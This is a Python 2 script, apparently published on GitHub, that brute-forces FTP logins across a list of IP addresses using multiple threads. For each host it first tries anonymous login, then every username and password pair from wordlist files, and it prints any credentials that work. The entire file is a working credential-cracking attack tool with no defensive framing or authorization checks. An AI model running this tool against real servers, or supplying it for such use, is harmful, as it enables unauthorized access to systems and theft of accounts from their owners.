#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/JYanger

import threading
import ftplib, socket
import sys, time, random
import Queue



global port
global userlist
global passlist

port = 21
userlist = [i.rstrip() for i in open("ftp_users.txt")]
passlist = [j.rstrip() for j in open("ftp_pwds.txt")]


def usage():
        print u"用法: FTP_brute.py  待破解的ip列表  线程数"
        print u"实例: FTP_brute.py  ip.txt  thread_nums"


class MyThread(threading.Thread):
        def __init__(self,queue):
            threading.Thread.__init__(self)
            self.queue = queue
        def run(self):
            while True:  # 除非确认队列中已经无任务，否则时刻保持线程在运行
                try:
                    ip = self.queue.get(block=False)    # 如果队列空了，直接结束线程。根据具体场景不同可能不合理，可以修改
                    brute_users(ip,)
                except Exception as e:
                    break 


     
def brute_anony(ip):
        try:
            #print '[+] 测试匿名登陆……\n'
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=0.01)
            #print 'FTP消息: %s \n' % ftp.getwelcome()
            ftp.login()
            #ftp.retrlines('LIST')
            ftp.quit()
            #print '\n[+] 匿名登陆成功……\n'
            return 100
        except ftplib.all_errors:
            #print '\n[-] 匿名登陆失败……\n'
            return 0

def brute_users(ip):
        
        if brute_anony(ip)==100:
            time.sleep(random.random())
            print '[+] '+str(ip)+':'+str(port)+u'  匿名登陆成功……'


        else:                         #匿名登录失败
            try:
                for user in userlist: 
                    for pwd in passlist:               #加载目录中，FTP_users、FTP_pwds字典爆破
                        try:
                           #print ip,user,pwd
                           ftp = ftplib.FTP()
                           ftp.connect(ip, port, timeout=0.01)
                           ftp.login(user, pwd)
                           #ftp.retrlines('LIST')
                           ftp.quit()
                           time.sleep(random.random())
                           print '[+] '+str(ip)+':'+str(port)+u' 破解成功， 用户名：%s 密码：%s' % (user, pwd)
                        except ftplib.all_errors:
                           pass
            except Exception as e:
                pass


def run(ipaddress,thread_nums):
        threads = []
        queue = Queue.Queue()
        file = open(ipaddress,'r')
        for ip in file.readlines():
            ip=ip.replace('\n','')
            ip=ip.replace('\r','')
            queue.put(ip)
        file.close()
        for i in range(thread_nums):
            threads.append(MyThread(queue))
        for t in threads:
            try:
                t.start()
            except Exception as e:
                print e
                continue
        for t in threads:
            try:
                t.join()
            except Exception as e:
                print e
                continue
	 
if __name__ == '__main__':
        print '+' + '-' * 55 + '+'
        print u"+         Python2 FTP暴破工具<批量ip多线程版>"
        print u'+         https://github.com/JYanger'
        #print '+' + '-' * 55 + '+'
        
        start_time = time.time()
        if len(sys.argv)!=3:
            usage()
            exit()
        else:
            thread_nums = sys.argv[2]
            iplist = [i.rstrip() for i in open(sys.argv[1])]
            print u'总 ip 数：%d 条' % len(iplist)
            print u'用户条目：%d 条' % len(userlist)
            print u'密码条目：%d 条' % len(passlist)
            print u'总破解数：%s 次\n'%(len(iplist)*len(userlist)*len(passlist))

            print u'现在时间：'+ time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'\n'
            print u'[+] FTP暴破测试中……\n'
            run(sys.argv[1],int(sys.argv[2]))
            print u'[+] 破解完成，用时： %d 秒' % (time.time() - start_time)

        print u'最后时间：' + time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'\n'
        print '+' + '-' * 55 + '+'




